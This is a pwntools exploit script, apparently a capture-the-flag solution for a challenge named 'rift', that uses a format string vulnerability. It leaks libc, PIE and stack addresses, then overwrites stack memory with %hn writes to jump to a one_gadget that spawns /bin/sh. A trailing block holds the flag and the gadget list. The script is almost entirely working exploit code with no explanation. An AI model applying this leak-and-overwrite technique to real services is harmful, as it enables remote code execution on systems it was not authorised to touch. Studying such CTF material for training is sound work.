#!/usr/bin/python3

from pwn import *

exe = ELF('rift_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x11EE

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote("tamuctf.com", 443, ssl=True, sni="rift")
else:
    p = process(exe.path)

GDB()



offset = (0x7ffff7fc98d0-0x7ffff7e0d000)
offset


# io.interactive(prompt="")
p.sendline(b'%1$lx.%9$lx.%13$lx')    # libc offset, and piebase+0x1214
res = p.recvline().decode().strip()

libc_addr, pie_base_addr, stack = res.split('.')
libc.address = int(libc_addr, 16) - offset
exe.address = int(pie_base_addr, 16) - 0x1214
stack = int(stack, 16)
target = stack - 0x28 - 0x100
print('libc address', hex(libc.address))
print('elf address', hex(exe.address))
print('stack', hex(stack))
print('stack', hex(target))

print('printf', hex(exe.got['printf']))
print('libc system', hex(libc.symbols['system']))


one_gadget = libc.address + 0xe5306
# 39

order = [one_gadget & 0xffff, one_gadget >> 16 & 0xffff, one_gadget >> 32 & 0xffff]
for i in range(3):
        payload = f"%{(target+32+(i)*2) & 0xffff}c%13$hn".ljust(16)
        sl(payload)
        payload = f"%{order[i]}c%39$hn"
        sl(payload)
payload = f"%{(target+24) & 0xffff}c%13$hn".ljust(16)
sl(payload)
payload = f"%{(exe.address + 0x11fb)&0xffff}c%39$hn"
sl(payload)
p.interactive()
'''
gigem{ropping_in_style}
0x4497f execve("/bin/sh", rsp+0x30, environ)
constraints:
  address rsp+0x40 is writable
  rax == NULL || {rax, "-c", r12, NULL} is a valid argv

0x449d3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xe5306 execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL || {[rsp+0x60], [rsp+0x68], [rsp+0x70], [rsp+0x78], ...} is a valid argv
'''